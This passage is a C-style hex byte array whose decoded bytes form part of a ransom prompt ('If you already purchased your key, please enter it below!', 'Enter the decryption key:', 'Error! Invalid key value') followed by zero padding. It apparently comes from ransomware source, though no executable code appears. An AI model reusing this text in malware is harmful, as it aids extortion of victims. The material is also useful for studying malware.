		0x65, 0x72, 0x65, 0x0A, 0x0D, 0x20, 0x0A, 0x0D, 0x20, 0x49, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20,
		0x61, 0x6C, 0x72, 0x65, 0x61, 0x64, 0x79, 0x20, 0x70, 0x75, 0x72, 0x63, 0x68, 0x61, 0x73, 0x65,
		0x64, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x6B, 0x65, 0x79, 0x2C, 0x20, 0x70, 0x6C, 0x65, 0x61,
		0x73, 0x65, 0x20, 0x65, 0x6E, 0x74, 0x65, 0x72, 0x20, 0x69, 0x74, 0x20, 0x62, 0x65, 0x6C, 0x6F,
		0x77, 0x21, 0x0A, 0x0D, 0x20, 0x0A, 0x0D, 0x00, 0x20, 0x45, 0x6E, 0x74, 0x65, 0x72, 0x20, 0x74,
		0x68, 0x65, 0x20, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6B, 0x65,
		0x79, 0x3A, 0x20, 0x00, 0x20, 0x20, 0x3D, 0x3E, 0x20, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x21, 0x20,
		0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x6B, 0x65, 0x79, 0x20, 0x76, 0x61, 0x6C, 0x75,
		0x65, 0x0A, 0x0D, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};